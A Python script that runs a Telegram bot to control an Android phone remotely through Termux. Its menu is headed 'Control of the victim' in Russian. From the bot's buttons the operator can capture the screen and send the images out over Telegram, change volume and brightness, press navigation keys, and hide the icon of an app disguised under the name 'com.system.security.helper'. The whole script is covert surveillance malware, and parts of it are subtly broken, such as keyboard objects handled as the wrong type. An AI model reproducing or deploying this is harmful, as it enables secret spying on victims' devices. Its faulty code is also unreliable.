import subprocess, requests, json, time, os, base64, io
from PIL import Image
import android_permissions
android_permissions.request_permissions()

DB_URL = open('config.py').read().split('FIREBASE_DB_URL = "')[1].split('"')[0]
TOKEN = open('config.py').read().split('TELEGRAM_BOT_TOKEN = "')[1].split('"')[0]
MY_ID = int(open('config.py').read().split('YOUR_TELEGRAM_ID = ')[1].split()[0])

import threading, http.server, socketserver, urllib.parse, hashlib, sqlite3, sys, shutil
sys.path.insert(0, '/data/data/com.termux/files/usr/lib/python3.11/site-packages')
from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

bot = Bot(TOKEN)
app = Application.builder().token(TOKEN).build()

def set_volume(level): subprocess.run(['termux-volume', 'music', str(level)])
def get_volume(): return int(subprocess.run(['termux-volume', 'music'], capture_output=True).stdout.decode().split(':')[1].strip())
def set_brightness(level): subprocess.run(['termux-brightness', str(level)])
def get_brightness(): return int(subprocess.run(['termux-brightness'], capture_output=True).stdout.decode().strip())
def screenshot():
    subprocess.run(['termux-screenshot', '/sdcard/screen.png'])
    return open('/sdcard/screen.png', 'rb').read()

async def start(update, context):
    if update.effective_user.id != MY_ID: return await update.message.reply_text('Unauthorized')
    keyboard = [[InlineKeyboardButton("📸 Скриншот", callback_data='scr')],
                [InlineKeyboardButton("🔊 +", callback_data='vol_up'), InlineKeyboardButton("🔉 -", callback_data='vol_down'), InlineKeyboardButton(f"Громкость: {get_volume()}%", callback_data='none')],
                [InlineKeyboardButton("☀️ +", callback_data='bright_up'), InlineKeyboardButton("🌙 -", callback_data='bright_down'), InlineKeyboardButton(f"Яркость: {get_brightness()}%", callback_data='none')],
                [InlineKeyboardButton("⬅️ Назад", callback_data='back'), InlineKeyboardButton("⭕ Выйти", callback_data='exit')],
                [InlineKeyboardButton("👁️ Скрыть иконку", callback_data='hide_icon')]]
    await update.message.reply_text("Управление жертвой:", reply_markup=InlineKeyboardMarkup(keyboard))

async def callback(update, context):
    query = update.callback_query
    if update.effective_user.id != MY_ID: return await query.answer()
    await query.answer()
    vol = get_volume(); bright = get_brightness()
    if query.data == 'scr':
        img = screenshot()
        await query.message.reply_photo(photo=img, caption=f"Скриншот | Громкость: {vol}% Яркость: {bright}%")
    elif query.data == 'vol_up': set_volume(min(100, vol+20)); await query.edit_message_reply_markup(reply_markup=update_keyboard())
    elif query.data == 'vol_down': set_volume(max(0, vol-20)); await query.edit_message_reply_markup(reply_markup=update_keyboard())
    elif query.data == 'bright_up': set_brightness(min(255, bright+51)); await query.edit_message_reply_markup(reply_markup=update_keyboard())
    elif query.data == 'bright_down': set_brightness(max(0, bright-51)); await query.edit_message_reply_markup(reply_markup=update_keyboard())
    elif query.data == 'back': subprocess.run(['input', 'keyevent', '4'])
    elif query.data == 'exit': subprocess.run(['input', 'keyevent', '3'])
    elif query.data == 'hide_icon':
        subprocess.run(['pm', 'disable', '--user', '0', 'com.system.security.helper/.MainActivity'])
        keyboard = update_keyboard(); keyboard.inline_keyboard[-1][0] = InlineKeyboardButton("👁️ Вернуть иконку", callback_data='show_icon')
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard.inline_keyboard))
    elif query.data == 'show_icon':
        subprocess.run(['pm', 'enable', 'com.system.security.helper/.MainActivity'])
        keyboard = update_keyboard(); keyboard.inline_keyboard[-1][0] = InlineKeyboardButton("👁️ Скрыть иконку", callback_data='hide_icon')
        await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(keyboard.inline_keyboard))

def update_keyboard():
    vol = get_volume(); bright = get_brightness()
    return [[InlineKeyboardButton("📸 Скриншот", callback_data='scr')],
            [InlineKeyboardButton("🔊 +", callback_data='vol_up'), InlineKeyboardButton("🔉 -", callback_data='vol_down'), InlineKeyboardButton(f"Громкость: {vol}%", callback_data='none')],
            [InlineKeyboardButton("☀️ +", callback_data='bright_up'), InlineKeyboardButton("🌙 -", callback_data='bright_down'), InlineKeyboardButton(f"Яркость: {bright}%", callback_data='none')],
            [InlineKeyboardButton("⬅️ Назад", callback_data='back'), InlineKeyboardButton("⭕ Выйти", callback_data='exit')],
            [InlineKeyboardButton("👁️ Скрыть иконку", callback_data='hide_icon')]]

app.add_handler(CommandHandler("start", start))
app.add_handler(CallbackQueryHandler(callback))
app.run_polling()
